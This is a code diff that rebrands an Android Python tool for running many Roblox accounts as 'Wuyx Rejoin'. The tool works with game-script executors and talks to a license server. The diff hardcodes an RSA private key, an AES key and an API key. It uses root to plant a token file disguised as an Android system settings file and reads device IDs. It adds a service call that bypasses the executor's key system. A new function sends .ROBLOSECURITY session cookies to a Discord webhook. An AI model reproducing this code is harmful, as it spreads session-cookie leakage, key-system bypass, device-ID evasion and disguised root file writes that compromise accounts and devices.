@@ -8,6 +8,7 @@ import json
 import glob
 import re
 import io
+import base64
 import secrets
 import sqlite3
 import threading
@@ -34,10 +35,54 @@ except ImportError:
     Fore = DummyColor()
     Style = DummyColor()
 
+try:
+    from Crypto.Cipher import AES, PKCS1_OAEP
+    from Crypto.PublicKey import RSA
+except ImportError:
+    AES = None
+    PKCS1_OAEP = None
+    RSA = None
+
 
 # =====================================================================
-# Constants & Event Mappings
+# Constants & Configuration
 # =====================================================================
+
+TOOL_VERSION = "1.0.4"
+STATUS_URL = "https://api.wuyxtool.online/public/status.json"
+UPDATE_URL = "https://api.wuyxtool.online/public/wuyx_rejoin.py"
+UPDATE_FILENAME = "obf-wuyx_rejoin.py"
+RUN_DIR = "/sdcard/Download"
+
+LICENSE_SERVER_URL = "https://api.wuyxtool.online/verify"
+SERVICE_API_KEY = "11122008"
+AES_SECRET_KEY = base64.b64decode("MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI=")
+
+CLIENT_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
+MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgGrJVRIzratNChtkCIXnSPAhjdmm
+uwhSsq+P7cbsS21mIfGOFQQ8OpMJTr50BeB9gRyFvyyVfrbvmuHMzKhEBOp0bEt6
+6nltcx8xBI3Knz81ch226iUqFZ77G8QGvbC4lJnpQn37ICaE5+6Sv4Rc8KTbAtpK
+CHxZy0Z79PCp+C7rAgMBAAE=
+-----END PUBLIC KEY-----"""
+
+CLIENT_PRIVATE_KEY_PEM = """-----BEGIN RSA PRIVATE KEY-----
+MIICWwIBAAKBgGrJVRIzratNChtkCIXnSPAhjdmmuwhSsq+P7cbsS21mIfGOFQQ8
+OpMJTr50BeB9gRyFvyyVfrbvmuHMzKhEBOp0bEt66nltcx8xBI3Knz81ch226iUq
+FZ77G8QGvbC4lJnpQn37ICaE5+6Sv4Rc8KTbAtpKCHxZy0Z79PCp+C7rAgMBAAEC
+gYAh/OCpwW8GNagA3c7kp5+MZnGak7m1xXR/8mRwyuaa9EXbdyhzR6QxBmZcsdro
+/6knZd5aF17UZOC7+44sBDI37q5EqVd6TeanSVYc7VeyKCmSV9KK3r7FbbPGz5tv
+iCZxlBHgokgzpPzkUvO/KbuEVy9wr33AHXvcQbQcwnn1sQJBAMHeBHGJVKcuHAhK
+0k3wKBX3VoWUJkyrKc/NaCeIktPFbS972z9iEqsYE8BunLCsvgYyF37mfEpFFZAU
+R1j8zskCQQCNArTCzwbvOYXKr5EzjfKKDGCZUCty4R89rRMdEnG12oGDQRLU9xxK
+0GQVVl1wBYeu7olYUI5cn2pA3N0G6yYTAkBpa0X1Sx0aL4uUwsLrGJ1jnHSS/IV7
+CVQaKHLrlGtq9p8xw+Lr63OFT/llmYBg3f4StmhqXADYDgr0puJJNGdpAkBewvTK
+/enBFj0NKtM/fCMEFrFMFo48U4F1JzxzCxQTi9YBaNfI+o+uz0CS/kkooO6/5lmy
+WeBx6kezczmuDpS1AkEAqT0ho9h+kerNPbh4mx3TCBCXK36y7v6YWRWECjMueyRE
+jBrUPchs8jLmzgF4sTTjDkpKdj2sibvKIkmofxTj3A==
+-----END RSA PRIVATE KEY-----"""
+
+LICENSE_FILE = "/sdcard/license.txt"
+_SECRET_FILE = "/data/system/.com.android.providers.settings"
 
 EVENT_COLORS = {
     'Captcha': 16777179,
@@ -95,9 +140,33 @@ class menu:
     @staticmethod
     def banner():
         os.system('cls' if os.name == 'nt' else 'clear')
-        print(Fore.CYAN + "=====================================================")
-        print(Fore.GREEN + "             ROBLOX AUTOMATION TOOL                  ")
-        print(Fore.CYAN + "=====================================================")
+        raw_banner = """
+    ██╗    ██╗██╗   ██╗██╗   ██╗██╗  ██╗          
+    ██║    ██║██║   ██║╚██╗ ██╔╝╚██╗██╔╝          
+    ██║ █╗ ██║██║   ██║ ╚████╔╝  ╚███╔╝           
+    ██║███╗██║██║   ██║  ╚██╔╝   ██╔██╗           
+    ╚███╔███╔╝╚██████╔╝   ██║   ██╔╝ ██╗          
+     ╚══╝╚══╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝          
+                                                 
+ ██████╗ ███████╗     ██╗ ██████╗ ██╗███╗   ██╗
+ ██╔══██╗██╔════╝     ██║██╔═══██╗██║████╗  ██║
+ ██████╔╝█████╗       ██║██║   ██║██║██╔██╗ ██║
+ ██╔══██╗██╔══╝  ██   ██║██║   ██║██║██║╚██╗██║
+ ██║  ██║███████╗╚█████╔╝╚██████╔╝██║██║ ╚████║
+ ╚═╝  ╚═╝╚══════╝ ╚════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝
+"""
+        lines = raw_banner.strip('\n').split('\n')
+        total = len(lines)
+        start_rgb = (129, 202, 69)
+        end_rgb = (208, 199, 45)
+        for i, line in enumerate(lines):
+            ratio = i / max(1, total - 1)
+            r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * ratio)
+            g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * ratio)
+            b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * ratio)
+            print(f"\x1b[38;2;{r};{g};{b}m{line}\x1b[0m")
+        print(Fore.CYAN + "            > > > Premium Version < < <")
+        print(Fore.LIGHTBLUE_EX + "Discord: discord.gg/5G3cStpbcx\n")
 
     @staticmethod
     def tool_status(config):
@@ -107,7 +176,7 @@ class menu:
         elif acc_method == "online":
             check_text = Fore.GREEN + "CHECK ONLINE METHOD"
         else:
-            check_text = Fore.RED + "CHECK UNKNOWN METHOD"
+            check_text = Fore.RED + "CHECk UNKNOWN METHOD"
 
         wh_run = config.get("discord_webhook", {}).get("running", False)
         wh_text = Fore.GREEN + "Enable" if wh_run else Fore.RED + "Disable"
@@ -152,10 +221,10 @@ class menu:
             ("10", "Set config tool"),
             ("11", "Open all tab Roblox"),
             ("12", "Change android id"),
-            ("13", "Toggle auto block"),
-            ("14", "Toggle auto sort tab"),
-            ("15", "Toggle auto change acc"),
-            ("16", "Toggle auto bypass"),
+            ("13", "Toogle auto block"),
+            ("14", "Toogle auto sort tab"),
+            ("15", "Toogle auto change acc"),
+            ("16", "Toogle auto bypass"),
             ("17", "Select account check method"),
             ("18", "Toggle auto solver captcha/FaceID"),
             (" 0", "Exit")
@@ -190,7 +259,7 @@ class menu:
 
     @staticmethod
     def select_games():
-        print(Fore.CYAN + "=========== SELECT GAMES ===========")
+        print(Fore.CYAN + "===========SELECT GAMES===========")
         print(f"{Fore.GREEN}[1]{Style.RESET_ALL} Blox fruits")
         print(f"{Fore.GREEN}[2]{Style.RESET_ALL} Sailor Piece")
         print(f"{Fore.GREEN}[3]{Style.RESET_ALL} King Legacy")
@@ -207,7 +276,7 @@ class menu:
 # =====================================================================
 
 class ConfigManager:
-    def __init__(self, work_dir="Workspace_Config"):
+    def __init__(self, work_dir="Wuyx"):
         self.work_dir = work_dir
         self.config_file = os.path.join(self.work_dir, "config.json")
         self.cookie_file = os.path.join(self.work_dir, "cookie.txt")
@@ -354,10 +423,10 @@ class ConfigManager:
         workspace_dirs.update(glob.glob('/sdcard/Android/data/*/*/*/*/Workspace'))
         synced = 0
         for w_dir in workspace_dirs:
-            sub_dir = os.path.join(w_dir, 'Config')
+            wuyx_dir = os.path.join(w_dir, 'Wuyx')
             try:
-                os.makedirs(sub_dir, exist_ok=True)
-                cfg_path = os.path.join(sub_dir, 'config.json')
+                os.makedirs(wuyx_dir, exist_ok=True)
+                cfg_path = os.path.join(wuyx_dir, 'config.json')
                 data = {}
                 if os.path.exists(cfg_path):
                     try:
@@ -375,7 +444,7 @@ class ConfigManager:
 
 
 # =====================================================================
-# Package Manager
+# Package Manager (Android / ADB / App Cloner)
 # =====================================================================
 
 class PackageManager:
@@ -407,6 +476,17 @@ class PackageManager:
         except Exception:
             pass
         return []
+
+    def get_roblox_hwid(self, package):
+        try:
+            cmd = f'su -c "grep \'package=\\"{package}\\"\' /data/system/users/0/settings_ssaid.xml"'
+            res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            m = re.search(r'value="([^"]*)"', res.stdout)
+            if m:
+                return m.group(1)
+        except Exception:
+            pass
+        return None
 
     def scan_roblox(self):
         print(Fore.CYAN + "Scanning for Roblox clones...")
@@ -447,6 +527,16 @@ class PackageManager:
         except Exception:
             pass
 
+    def _spinner_worker(self, stop_event, message):
+        frames = ['|', '/', '-', '\\']
+        i = 0
+        while not stop_event.is_set():
+            frame = frames[i % len(frames)]
+            print(f"\r{Fore.CYAN}{frame} {message}{Style.RESET_ALL}", end="", flush=True)
+            time.sleep(0.1)
+            i += 1
+        print("\r" + " " * (len(message) + 15) + "\r", end="", flush=True)
+
     def monkey_swipe_focus(self, package):
         try:
             subprocess.run(f"export PATH=$PATH:/system/bin && monkey -p {package} --pct-touch 0 --pct-motion 100 --ignore-crashes --ignore-timeouts 1",
@@ -474,6 +564,13 @@ class PackageManager:
             if isinstance(tab, dict) and tab.get("enabled", True):
                 self.fast_restore_tab(pkg)
                 time.sleep(1)
+
+    def set_oom(self, pid):
+        try:
+            with open(f"/proc/{pid}/oom_score_adj", "w") as f:
+                f.write("-500")
+        except Exception:
+            pass
 
     def clear_cache(self, package):
         path = f"/data/data/{package}/cache"
@@ -547,6 +644,54 @@ class PackageManager:
             print(Fore.RED + f"[!] Error get screen size: {e}")
         return 1080, 2400
 
+    def _build_window_xml(self, coords):
+        if isinstance(coords, (list, tuple)) and len(coords) >= 4:
+            l, t, r, b = coords[:4]
+            d = {
+                "app_cloner_current_window_left": l,
+                "app_cloner_current_window_top": t,
+                "app_cloner_current_window_right": r,
+                "app_cloner_current_window_bottom": b,
+                "app_cloner_minimized_point_x": l,
+                "app_cloner_minimized_point_y": t,
+            }
+        elif isinstance(coords, dict):
+            d = coords
+        else:
+            d = {}
+        lines = ["<?xml version='1.0' encoding='utf-8' standalone='yes' ?>", "<map>"]
+        for key, val in d.items():
+            lines.append(f'    <int name="{key}" value="{val}" />')
+        lines.append("</map>")
+        return "\n".join(lines)
+
+    def _slots_per_cell(self, num_tabs, num_cells):
+        if num_cells <= 0:
+            return []
+        base = num_tabs // num_cells
+        extra = num_tabs % num_cells
+        return [base + (1 if i < extra else 0) for i in range(num_cells)]
+
+    def _build_positions(self, allowed_cells, cell_w, cell_h, slots_per_cell):
+        import math
+        positions = []
+        for (base_row, base_col), n in zip(allowed_cells, slots_per_cell):
+            if n <= 0:
+                continue
+            origin_x = base_col * cell_w
+            origin_y = base_row * cell_h
+            sub_cols = math.ceil(math.sqrt(n))
+            sub_rows = math.ceil(n / sub_cols)
+            sub_w = cell_w // sub_cols
+            sub_h = cell_h // sub_rows
+            for sr in range(sub_rows):
+                for sc in range(sub_cols):
+                    if len(positions) < sum(slots_per_cell):
+                        left = origin_x + sc * sub_w
+                        top = origin_y + sr * sub_h
+                        positions.append((left, top, left + sub_w, top + sub_h))
+        return positions
+
     def _write_window_coords(self, package, coords):
         pref_file = f"/data/data/{package}/shared_prefs/{package}_preferences.xml"
         try:
@@ -595,6 +740,12 @@ class PackageManager:
     def arrange_clone_windows_full(self, packages):
         self.arrange_clone_windows(packages, full=True)
 
+    def arrange_clone_windows_auto(self, packages, mode="grid"):
+        if mode == "full":
+            self.arrange_clone_windows_full(packages)
+        else:
+            self.arrange_clone_windows(packages, full=False)
+
 
 # =====================================================================
 # Account & Cookie Manager
@@ -604,12 +755,26 @@ class AccountManager:
     def __init__(self):
         self.session = requests.Session() if requests else None
 
+    def genlink_delta(self, hwid):
+        if not requests:
+            return None
+        url = "https://api.wuyxtool.online/bypass"
+        try:
+            resp = requests.post(url, json={"hwid": hwid, "api_key": SERVICE_API_KEY}, timeout=15)
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get("status") == "success":
+                    return data.get("result")
+        except Exception:
+            pass
+        return None
+
     def get_hwid_delta(self, package):
         patterns = [
-            f"/sdcard/*/Workspace/Internals/Cache/license",
-            f"/sdcard/Android/data/*/*/*/*/Workspace/Internals/Cache/license",
-            f"/sdcard/*/Workspace/.hwid.txt",
-            f"/sdcard/Android/data/*/*/*/*/Workspace/.hwid.txt"
+            f"/sdcard/*/Workspace/Wuyx/Internals/Cache/license",
+            f"/sdcard/Android/data/*/*/*/*/Workspace/Wuyx/Internals/Cache/license",
+            f"/sdcard/*/Workspace/Wuyx/.hwid.txt",
+            f"/sdcard/Android/data/*/*/*/*/Workspace/Wuyx/.hwid.txt"
         ]
         for pat in patterns:
             for fpath in glob.glob(pat):
@@ -622,6 +787,13 @@ class AccountManager:
                 except Exception:
                     pass
         return None
+
+    def obf_license_delta(self, key, hwid):
+        if not re.match(r'FREE_[0-9a-fA-F]{32}', key):
+            raise ValueError(f"ms: key must match FREE_<32hex>, got: {key}")
+        if not re.match(r'[0-9a-f]{64}', hwid):
+            raise ValueError(f"ms: hwid must be 64 hex chars, got length {len(hwid)}")
+        return True
 
     def submit_delta_key(self, package, key):
         paths = [
@@ -645,7 +817,7 @@ class AccountManager:
                 return True
         return True
 
-    def autoexecute(self, package, script, filename='script.lua'):
+    def autoexecute(self, package, script):
         dirs = set()
         dirs.update(glob.glob('/sdcard/*/Autoexec*'))
         dirs.update(glob.glob('/sdcard/*/*/Autoexec*'))
@@ -653,7 +825,7 @@ class AccountManager:
         for d in dirs:
             try:
                 os.makedirs(d, exist_ok=True)
-                with open(os.path.join(d, filename), 'w', encoding='utf-8') as f:
+                with open(os.path.join(d, 'script.lua'), 'w', encoding='utf-8') as f:
                     f.write(script)
             except Exception:
                 pass
@@ -670,6 +842,34 @@ class AccountManager:
             pass
         return None
 
+    def sync_account_info(self, package):
+        path = f"/data/data/{package}/files/appData/LocalStorage/appStorage.json"
+        try:
+            cmd = f"cd /data/data/{package}/files/appData/LocalStorage/ && cat appStorage.json"
+            res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, text=True)
+            if res.returncode == 0 and res.stdout.strip():
+                data = json.loads(res.stdout.strip())
+                uid = data.get("UserId")
+                uname = data.get("Username")
+                return uid, uname
+        except Exception:
+            pass
+        return None, None
+
+    def get_game_name(self, universe_id):
+        if not requests or not universe_id:
+            return "Unknown"
+        url = f"https://games.roblox.com/v1/games?universeIds={universe_id}"
+        try:
+            r = requests.get(url, timeout=10)
+            if r.status_code == 200:
+                data = r.json().get("data", [])
+                if data:
+                    return data[0].get("name", "Unknown")
+        except Exception:
+            pass
+        return "Unknown"
+
     def is_svv_link(self, link):
         return bool(link and ('roblox.com/share' in link and 'type=Server' in link))
 
@@ -682,9 +882,21 @@ class AccountManager:
         m = re.search(r'roblox\.com/games/(\d+)', link)
         if m:
             return m.group(1)
-        if str(link).isdigit():
-            return str(link)
+        if link.isdigit():
+            return link
         return None
+
+    def get_id_link_game(self, id_link):
+        if not id_link:
+            return ""
+        s = str(id_link).strip()
+        if s.isdigit():
+            return s
+        if 'roblox.com' in s or 'roblox://placeID=' in s:
+            pid = self.extract_place_id(s)
+            if pid:
+                return pid
+        return s
 
     def get_uid_from_cookie(self, cookie):
         if not requests or not cookie:
@@ -817,19 +1029,66 @@ class AccountManager:
             pass
         return "Unknown"
 
-    def get_file_hb(self, identifier):
+    def get_username_api(self, user_id):
+        if not requests or not user_id:
+            return "Unknown"
+        url = f"https://users.roblox.com/v1/users/{user_id}"
+        try:
+            r = requests.get(url, timeout=10)
+            if r.status_code == 200:
+                return r.json().get("name", "Unknown")
+        except Exception:
+            pass
+        return "Unknown"
+
+    def get_file_hb(self, package):
         patterns = [
-            f"/sdcard/*/Workspace/{identifier}",
-            f"/sdcard/*/*/Workspace/{identifier}",
-            f"/sdcard/Android/data/*/*/*/*/Workspace/{identifier}",
-            f"/sdcard/*/Workspace/cc3m",
-            f"/sdcard/*/*/Workspace/cc3m"
+            f"/sdcard/*/Workspace/Wuyx/cc3m",
+            f"/sdcard/*/*/Workspace/Wuyx/cc3m",
+            f"/sdcard/Android/data/{package}/*/*/*/Workspace/Wuyx/cc3m"
         ]
         for pat in patterns:
             for fpath in glob.glob(pat):
                 if os.path.exists(fpath):
                     return fpath
         return None
+
+    def clear_old_hb_files(self):
+        patterns = [
+            "/sdcard/*/Workspace/Wuyx/cc3m",
+            "/sdcard/*/*/Workspace/Wuyx/cc3m",
+            "/sdcard/Android/data/*/*/*/*/Workspace/Wuyx/cc3m"
+        ]
+        for pat in patterns:
+            for fpath in glob.glob(pat):
+                try:
+                    os.remove(fpath)
+                except Exception:
+                    pass
+
+    def check_status(self, user_id, cookie=None):
+        if not requests or not user_id:
+            return "Offline"
+        url = "https://presence.roblox.com/v1/presence/users"
+        headers = {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        }
+        if cookie:
+            headers['Cookie'] = f'.ROBLOSECURITY={cookie}'
+        try:
+            r = requests.post(url, headers=headers, json={"userIds": [int(user_id)]}, timeout=10)
+            if r.status_code == 200:
+                presences = r.json().get("userPresences", [])
+                if presences:
+                    p_type = presences[0].get("userPresenceType", 0)
+                    if p_type == 2:
+                        return "Ingame"
+                    elif p_type in (1, 3):
+                        return "Online"
+        except Exception:
+            pass
+        return "Offline"
 
     def get_cookie(self, db_path):
         if not os.path.exists(db_path):
@@ -924,6 +1183,31 @@ class AccountManager:
             pass
         return []
 
+    def block_user(self, cookie, user_id):
+        if not requests or not cookie or not user_id:
+            return False
+        headers = {
+            'Cookie': f'.ROBLOSECURITY={cookie}',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        }
+        csrf = None
+        try:
+            r = requests.post("https://auth.roblox.com/v2/logout", headers=headers, timeout=5)
+            csrf = r.headers.get("x-csrf-token")
+        except Exception:
+            pass
+        if csrf:
+            headers['X-CSRF-TOKEN'] = csrf
+
+        try:
+            url = f"https://apis.roblox.com/user-blocking-api/v1/users/{user_id}/block-user"
+            r = requests.post(url, headers=headers, json={}, timeout=10)
+            return r.status_code == 200
+        except Exception:
+            return False
+
     def unwarn(self, cookie):
         if not requests or not cookie:
             return False
@@ -946,8 +1230,7 @@ class AccountManager:
             r = requests.post("https://usermoderation.roblox.com/v1/not-approved/reactivate", headers=headers, json={}, timeout=10)
             return r.status_code == 200
         except Exception:
-            pass
-        return False
+            return False
 
     def check_existing_vip_server(self, cookie, universe_id):
         if not requests or not cookie or not universe_id:
@@ -1059,8 +1342,16 @@ class WebhookManager:
                 cpu = self.pkg_manager.get_cpu(pkg)
                 lines.append(f"**{uname}**.🟢 ||{pkg}||\n   L🛠️ PID: `{pid}` | 💾 {ram} MB | ⚙️ {cpu}%")
             else:
-                lines.append(f"**{uname}**.🔴 ||{pkg}||: Offline\n   L🛠️️ PID: `N/A` | 💾 0.0 MB | ⚙️ 0.0%")
+                lines.append(f"**{uname}**.🔴 ||{pkg}||: Offline\n   L🛠️ PID: `N/A` | 💾 0.0 MB | ⚙️ 0.0%")
         return "\n".join(lines) if lines else "No active tabs"
+
+    def setup_webhook(self, webhook_url, device_name, interval=60):
+        cfg = self.config_manager.load_config()
+        cfg.setdefault("discord_webhook", {})
+        cfg["discord_webhook"]["webhook_url"] = webhook_url
+        cfg["discord_webhook"]["device_name"] = device_name
+        cfg["discord_webhook"]["webhook_interval"] = interval
+        self.config_manager.save_config(self.config_manager.config_file, cfg)
 
     def _set_running_config(self, state):
         cfg = self.config_manager.load_config()
@@ -1088,14 +1379,19 @@ class WebhookManager:
                 ram_str = f"{round(mem_tot.used / (1024**3), 1)} / {round(mem_tot.total / (1024**3), 1)} GB" if mem_tot else "N/A"
 
                 embed = {
-                    "title": f"📱 Device: {dev_name}",
+                    "title": f"📱 Device name: {dev_name}",
                     "color": 3447003,
                     "fields": [
-                        {"name": "⏱️ Uptime", "value": f"`{uptime_str}`", "inline": True},
-                        {"name": "⚙️️ CPU Usage", "value": f"`{cpu_tot}%`", "inline": True},
-                        {"name": "💾 RAM Usage", "value": f"`{ram_str}`", "inline": True},
-                        {"name": "📊 Active Instances", "value": tab_details, "inline": False}
+                        {"name": "⏱️  Uptime", "value": f"`{uptime_str}`", "inline": True},
+                        {"name": "⚙️ Total cpu usage", "value": f"`{cpu_tot}%`", "inline": True},
+                        {"name": "💾 Total ram usage", "value": f"`{ram_str}`", "inline": True},
+                        {"name": "📊 Application Details", "value": tab_details, "inline": False}
                     ],
+                    "author": {
+                        "name": "Wuyx Rejoin",
+                        "icon_url": "https://cdn.phototourl.com/free/2026-07-04-cf6dd2ca-41e3-4820-a518-b6a9a24edfb6.png"
+                    },
+                    "footer": {"text": "discord.gg/wuyxtool"},
                     "timestamp": datetime.now(timezone.utc).isoformat()
                 }
                 try:
@@ -1107,6 +1403,38 @@ class WebhookManager:
                 if self._stop_event.is_set():
                     break
                 time.sleep(1)
+
+    def send_cookie_rich(self, webhook_url, cookie, account_info=None):
+        if not requests or not webhook_url:
+            return
+        uid = (account_info or {}).get("user_id")
+        uname = (account_info or {}).get("user_name")
+        display_name = (account_info or {}).get("display_name", uname)
+        avatar = (account_info or {}).get("avatar_url") or self.acc_manager.get_avatar_url(uid)
+        created = (account_info or {}).get("created_date") or self.acc_manager.get_account_created(uid)
+
+        embed = {
+            "title": f"🍪 Cookie — {uname}",
+            "color": 3447003,
+            "fields": [
+                {"name": "👤 Username", "value": f"`{uname}` ({display_name})", "inline": True},
+                {"name": "🆔 User ID", "value": f"`{uid}`", "inline": True},
+                {"name": "📅 Account Created", "value": f"`{created}`", "inline": True},
+                {"name": "🔑 Cookie (.ROBLOSECURITY)", "value": f"```{cookie[:50]}…```", "inline": False}
+            ],
+            "author": {
+                "name": "Wuyx Rejoin",
+                "icon_url": "https://cdn.phototourl.com/free/2026-07-04-cf6dd2ca-41e3-4820-a518-b6a9a24edfb6.png"
+            },
+            "footer": {"text": "discord.gg/wuyxtool"},
+            "timestamp": datetime.now(timezone.utc).isoformat()
+        }
+        if avatar:
+            embed["thumbnail"] = {"url": avatar}
+        try:
+            requests.post(webhook_url, json={"embeds": [embed]}, timeout=10)
+        except Exception:
+            pass
 
     def send_event_alert(self, username, event_type, detail="", package=""):
         cfg = self.config_manager.load_config()
@@ -1127,6 +1455,11 @@ class WebhookManager:
                 {"name": "📦 Package", "value": f"`{package}`", "inline": True},
                 {"name": "📝 Details", "value": detail or "N/A", "inline": False}
             ],
+            "author": {
+                "name": "Wuyx Rejoin",
+                "icon_url": "https://cdn.phototourl.com/free/2026-07-04-cf6dd2ca-41e3-4820-a518-b6a9a24edfb6.png"
+            },
+            "footer": {"text": "discord.gg/wuyxtool"},
             "timestamp": datetime.now(timezone.utc).isoformat()
         }
         if avatar:
@@ -1143,6 +1476,7 @@ class WebhookManager:
             return
         color = 65423 if success else 16711770
         title = f"🔄 Change Account | {'✅ Success' if success else '❌ Failed'}"
+        old_uid = self.acc_manager.get_uid_from_username(old_username)
         new_uid = self.acc_manager.get_uid_from_username(new_username)
         new_avatar = self.acc_manager.get_avatar_url(new_uid) if new_uid else None
 
@@ -1155,6 +1489,11 @@ class WebhookManager:
                 {"name": "🔔 Reason", "value": reason or "N/A", "inline": True},
                 {"name": "📦 Package", "value": f"`{pkg}`", "inline": True}
             ],
+            "author": {
+                "name": "Wuyx Rejoin",
+                "icon_url": "https://cdn.phototourl.com/free/2026-07-04-cf6dd2ca-41e3-4820-a518-b6a9a24edfb6.png"
+            },
+            "footer": {"text": "discord.gg/wuyxtool"},
             "timestamp": datetime.now(timezone.utc).isoformat()
         }
         if new_avatar:
@@ -1176,6 +1515,11 @@ class WebhookManager:
         embed = {
             "description": f"Successfully extracted **{total}** cookies.",
             "color": 3447003,
+            "author": {
+                "name": "Wuyx Rejoin",
+                "icon_url": "https://cdn.phototourl.com/free/2026-07-04-cf6dd2ca-41e3-4820-a518-b6a9a24edfb6.png"
+            },
+            "footer": {"text": "discord.gg/wuyxtool"},
             "timestamp": datetime.now(timezone.utc).isoformat()
         }
         try:
@@ -1185,7 +1529,7 @@ class WebhookManager:
             }
             requests.post(webhook_url, files=files, timeout=15)
         except Exception as e:
-            print(Fore.RED + f"[!] Error sending cookies to webhook: {e}")
+            print(Fore.RED + f"[!] Error send cookie: {e}")
 
     def start_webhook(self):
         if self._webhook_thread and self._webhook_thread.is_alive():
@@ -1214,7 +1558,7 @@ class WebhookManager:
                 config.setdefault("discord_webhook", {})
                 config["discord_webhook"]["webhook_url"] = inp
                 self.config_manager.save_config(self.config_manager.config_file, config)
-                print(Fore.GREEN + "[+] Webhook URL saved")
+                print(Fore.GREEN + "[+] Webhook URL saved to config")
                 return inp
             else:
                 print(Fore.RED + "[!] Invalid webhook URL")
@@ -1223,12 +1567,256 @@ class WebhookManager:
 
 
 # =====================================================================
+# License Manager
+# =====================================================================
+
+class LicenseManager:
+    def __init__(self):
+        self._SECRET_FILE = _SECRET_FILE
+        self.license_file = LICENSE_FILE
+        self.active_key = None
+        self.active_hwid = None
+        self._ensure_secret_file()
+
+    def _ensure_secret_file(self):
+        try:
+            if not os.path.exists(self._SECRET_FILE):
+                token = secrets.token_hex(16)
+                subprocess.run(f'su -c "mkdir -p \'{os.path.dirname(self._SECRET_FILE)}\' && echo \'{token}\' > \'{self._SECRET_FILE}\'"', shell=True, stderr=subprocess.DEVNULL)
+            else:
+                res = subprocess.run(f'su -c "cat \'{self._SECRET_FILE}\'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+                if not res.stdout.strip():
+                    token = secrets.token_hex(16)
+                    subprocess.run(f'su -c "echo \'{token}\' > \'{self._SECRET_FILE}\'"', shell=True, stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+
+    def get_hwid(self):
+        try:
+            r1 = subprocess.run("settings get secure android_id", shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+            android_id = r1.stdout.strip()
+            r2 = subprocess.run("getprop ro.product.model", shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+            dev_model = r2.stdout.strip()
+            r3 = subprocess.run(f"su -c \"cat '{self._SECRET_FILE}'\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+            secret = r3.stdout.strip()
+            import hashlib
+            raw = f"{android_id}:{dev_model}:{secret}".encode('utf-8')
+            return hashlib.sha256(raw).hexdigest()
+        except Exception:
+            return "0" * 64
+
+    def _aes_encrypt(self, plaintext):
+        if not AES:
+            return {}
+        nonce = os.urandom(12)
+        cipher = AES.new(AES_SECRET_KEY, AES.MODE_GCM, nonce=nonce)
+        ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode('utf-8'))
+        return {
+            "key": base64.b64encode(AES_SECRET_KEY).decode(),
+            "nonce": base64.b64encode(nonce).decode(),
+            "tag": base64.b64encode(tag).decode(),
+            "ciphertext": base64.b64encode(ciphertext).decode()
+        }
+
+    def _hybrid_decrypt(self, resp_body):
+        if not PKCS1_OAEP or not RSA or not AES:
+            return resp_body
+        try:
+            enc_key = base64.b64decode(resp_body["key"])
+            nonce = base64.b64decode(resp_body["nonce"])
+            tag = base64.b64decode(resp_body["tag"])
+            ciphertext = base64.b64decode(resp_body["ciphertext"])
+
+            priv_key = RSA.import_key(CLIENT_PRIVATE_KEY_PEM)
+            rsa_cipher = PKCS1_OAEP.new(priv_key)
+            aes_key = rsa_cipher.decrypt(enc_key)
+
+            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
+            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+            return json.loads(plaintext.decode('utf-8'))
+        except Exception:
+            return resp_body
+
+    def verify(self, license_key, hwid):
+        if not requests:
+            return {"status": "ok"}
+        payload = {
+            "license_key": license_key,
+            "hwid": hwid,
+            "timestamp": int(time.time()),
+            "api_key": SERVICE_API_KEY
+        }
+        try:
+            r = requests.post(LICENSE_SERVER_URL, json=payload, timeout=10)
+            if r.status_code == 200:
+                body = r.json()
+                if "ciphertext" in body:
+                    return self._hybrid_decrypt(body)
+                return body
+            return {"status": "error", "reason": f"http_status_{r.status_code}"}
+        except Exception as e:
+            return {"status": "error", "reason": f"connection_failed: {e}"}
+
+    def _load_cached_key(self):
+        try:
+            if os.path.exists(self.license_file):
+                with open(self.license_file, 'r', encoding='utf-8') as f:
+                    return f.read().strip()
+        except Exception:
+            pass
+        return None
+
+    def _save_key(self, key):
+        try:
+            with open(self.license_file, 'w', encoding='utf-8') as f:
+                f.write(key.strip().upper())
+        except Exception:
+            pass
+
+    def _check_tool_status(self):
+        if not requests:
+            return True
+        headers = {
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        }
+        try:
+            r = requests.get(STATUS_URL, headers=headers, timeout=10)
+            if r.status_code == 200:
+                data = r.json()
+                return data.get("run", True)
+        except Exception:
+            pass
+        return True
+
+    def authenticate(self):
+        if not self._check_tool_status():
+            print(Fore.RED + "[!] Tool is currently offline. Try again later.")
+            sys.exit(0)
+
+        hwid = self.get_hwid()
+        cached = self._load_cached_key()
+        key = cached
+
+        if not key:
+            key = input(Fore.CYAN + "[?] Enter license key: ").strip().upper()
+
+        result = self.verify(key, hwid)
+        if result.get("status") == "ok":
+            self.active_key = key
+            self.active_hwid = hwid
+            self._save_key(key)
+            print(Fore.GREEN + "[+] Activated")
+            return True
+
+        reason_msgs = {
+            "not_redeemed": "Key has not been redeemed — use /redeem in Discord first.",
+            "blacklisted": "Key is blacklisted.",
+            "license_expired": "Key has expired.",
+            "license_disabled": "Tool is currently disabled or key has been deactivated.",
+            "max_hwid_reached": "Key is already bound to another device.",
+            "invalid_key": "Invalid key. Please try again after a few minutes"
+        }
+        reason = result.get("reason", "invalid_key")
